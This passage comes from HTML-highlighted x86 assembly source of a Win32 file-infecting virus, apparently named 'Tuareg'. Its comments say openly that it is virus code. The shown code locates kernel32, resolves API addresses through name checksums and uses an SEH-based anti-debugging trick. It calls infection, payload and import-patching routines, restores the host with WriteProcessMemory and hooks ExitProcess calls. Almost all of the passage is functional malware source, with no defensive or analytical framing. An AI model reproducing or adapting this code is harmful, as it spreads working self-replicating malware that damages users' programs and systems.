                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImageBase2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc1">;; Set this counter to 0. Later we check if this counter has</span><span class="sc0">
         </span><span class="sc1">;; increased to the correct number of functions.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterOfFunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc1">;; Get the stack returning value for "CreateProcess". This value</span><span class="sc0">
         </span><span class="sc1">;; allows Win32 apps to finish with RET (many Micro$oft programs</span><span class="sc0">
         </span><span class="sc1">;; use this fact)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Store it for adj.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AuxCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Times to search</span><span class="sc0">

           </span><span class="sc1">;; SEH frame</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@JumpToHost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastStack</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">; For SEH returning</span><span class="sc0">
             
</span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; Subtract</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; EXE header?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MaybeKernelFound</span><span class="sc0">           </span><span class="sc1">; If so, jump</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AuxCounter</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease counter</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">                   </span><span class="sc1">; If it isn't 0, loop</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0137h</span><span class="sc0">   </span><span class="sc1">; If actual selector is less, we're in NT</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@GenerateException</span><span class="sc0">  </span><span class="sc1">; No hard-coded address for WinNT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0"> </span><span class="sc1">; Hard-coded under Win9x</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@KernelFound2</span><span class="sc0">    </span><span class="sc1">; Jump</span><span class="sc0">

</span><span class="sc1">;; This code, in fact, will jump to the host execution, since it's set as our</span><span class="sc0">
</span><span class="sc1">;; SEH manager. So, a jump here will execute host. Quite anti-debugger :)</span><span class="sc0">
</span><span class="sc5">@@GenerateException</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">@@MaybeKernelFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get PE address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc1">; Is it a PE header?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">        </span><span class="sc1">; If not, continue searching</span><span class="sc0">

         </span><span class="sc1">;; Now we are here when we found the address of Kernel32</span><span class="sc0">
</span><span class="sc5">@@KernelFound2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; We must set</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; this to 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitProcessInImport</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; ESI=Export directory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=Number of names in the array</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; EDX=RVA to the names array</span><span class="sc0">
     </span><span class="sc5">@@LoopCRC_APIs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCRCOfAPI</span><span class="sc0">    </span><span class="sc1">; Get checksum of the name under EDX</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; EBX=0</span><span class="sc0">
       </span><span class="sc5">@@LoopCheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">CRC_APIs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Coincidence?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FunctionFound</span><span class="sc0">     </span><span class="sc1">; If it coincides, we have found one</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">CRC_APIs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Have we finished?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheck</span><span class="sc0">      </span><span class="sc1">; If not, compare next stored checksum</span><span class="sc0">
       </span><span class="sc5">@@LoopCRC_APIs2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; Here if no one coincides</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Next RVA to function name</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;Arrgh! We are coding virus, so I had to</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCRC_APIs</span><span class="sc0"> </span><span class="sc1">;use LOOP! :) (this is speed optimization</span><span class="sc0">
                                     </span><span class="sc1">; but not size opt.!) bah, it doesn't</span><span class="sc0">
                                     </span><span class="sc1">; matter...</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Continue_001</span><span class="sc0">
  </span><span class="sc5">@@FunctionFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get its order in the array of names</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Convert it to word index</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the position into the ordinal</span><span class="sc0">
                                       </span><span class="sc1">; array</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add the base address</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the order into the function</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; array</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the RVA of the function</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">FunctionsToPatch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save it</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterOfFunctions</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase this</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopCRC_APIs2</span><span class="sc0">        </span><span class="sc1">; Check more</span><span class="sc0">
  </span><span class="sc5">@@Continue_001</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">;; [CounterOfFunctions] must be NumberOfFunctions. If not, something</span><span class="sc0">
       </span><span class="sc1">;; failed (too much or too few functions for the correct work of the</span><span class="sc0">
       </span><span class="sc1">;; virus) and we must exit.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterOfFunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NumberOfFunctions</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GenerateException</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectAllFiles</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RuntimeInfection</span><span class="sc0"> </span><span class="sc1">; The name explains it ;)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Payload</span><span class="sc0">     </span><span class="sc1">; I don't remember for what is this... :P</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PatchImportDirectory</span><span class="sc0">
    </span><span class="sc1">;; I changed the order of calling to this subfunctions, since an exception</span><span class="sc0">
    </span><span class="sc1">;; executes directly the host. If an exception occurs when patching the</span><span class="sc0">
    </span><span class="sc1">;; import directory, then the run-time infection woudln't run, so I have</span><span class="sc0">
    </span><span class="sc1">;; put the functions in the correct order to grant a wider expansion.</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GenerateException</span><span class="sc0">  </span><span class="sc1">; Finish runtime activity (the per-</span><span class="sc0">
                                    </span><span class="sc1">; process part remains "resident")</span><span class="sc0">
      </span><span class="sc1">; This jump is anulated since there isn't any need of it. Instead of</span><span class="sc0">
      </span><span class="sc1">; that, we use a fault, since SEH is active and will go directly to</span><span class="sc0">
      </span><span class="sc1">; @@JumpToHost :)</span><span class="sc0">

   </span><span class="sc1">;; SEH handler. This is the SEH that we put. If any exception happens, this</span><span class="sc0">
   </span><span class="sc1">;; will take control and it'll restore and execute directly the host.</span><span class="sc0">
</span><span class="sc5">@@JumpToHost</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BDh</span><span class="sc0">
</span><span class="sc5">DeltaOffset3</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; This is MOV EBP,DeltaOffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastStack</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Recover ESP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Restore SEH</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Release our handle from stack</span><span class="sc0">
           </span><span class="sc1">; This has been changed since the binary release. I noticed it had</span><span class="sc0">
           </span><span class="sc1">; a bug, so I corrected it. The binary that the AVers have differs</span><span class="sc0">
           </span><span class="sc1">; a little from this.</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; RVAs got?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SimulateExecError</span><span class="sc0">          </span><span class="sc1">; If not, we can't restore</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; the host</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SimulateExecError</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Host_Data_Size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">End_Virus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreAddress2</span><span class="sc4">]</span><span class="sc0">
                                  </span><span class="sc1">; Restore the overwritten part of .text with</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; the original code, saved at the end of the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; virus</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyExitProcess</span><span class="sc0"> </span><span class="sc1">; Modify the exit process callings</span><span class="sc0">
                                          </span><span class="sc1">; in .text to point to our zeroing</span><span class="sc0">
                                          </span><span class="sc1">; routine</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Jump to host</span><span class="sc0">

</span><span class="sc5">@@SimulateExecError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00BFF700h</span><span class="sc0">  </span><span class="sc1">; Construct NOP/MOV BYTE PTR [BFF70000],0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0005C690h</span><span class="sc0">  </span><span class="sc1">; in the stack frame to generate an excep-</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; tion from an "unknown module" :)</span><span class="sc0">
                                   </span><span class="sc1">; module" :)</span><span class="sc0">
</span><span class="sc5">TuaregMain</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InicIP</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FakedHost</span><span class="sc0">  </span><span class="sc1">; This variables are set now to si-</span><span class="sc0">
</span><span class="sc5">RestoreAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FakedHost</span><span class="sc0">  </span><span class="sc1">; mulate an infected program.</span><span class="sc0">
</span><span class="sc5">RestoreAddress2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CounterOfFunctions</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AuxCounter</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LastStack</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">InfectAllFiles</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function generates a checksum of the function name pointed by [EDX]</span><span class="sc0">
</span><span class="sc1">;; in the export directory in KERNEL32. I've tried to do a quite variable</span><span class="sc0">
</span><span class="sc1">;; formula from one name to other, without using huge tables like the standard</span><span class="sc0">
</span><span class="sc1">;; CRC32.</span><span class="sc0">
</span><span class="sc5">GetCRCOfAPI</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_Kernel32</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetCRCOfAPI2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; Load RVA to API name in EDI</span><span class="sc0">
     </span><span class="sc5">@@LoopAPI</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;If we reached the end of the name,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">            </span><span class="sc1">; exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get a number between 0 and 3 related to</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">; the current character in the name.</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">; ROL the current value in EAX.</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; XOR AL with the character in [EDX]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Next char</span><span class="sc0">
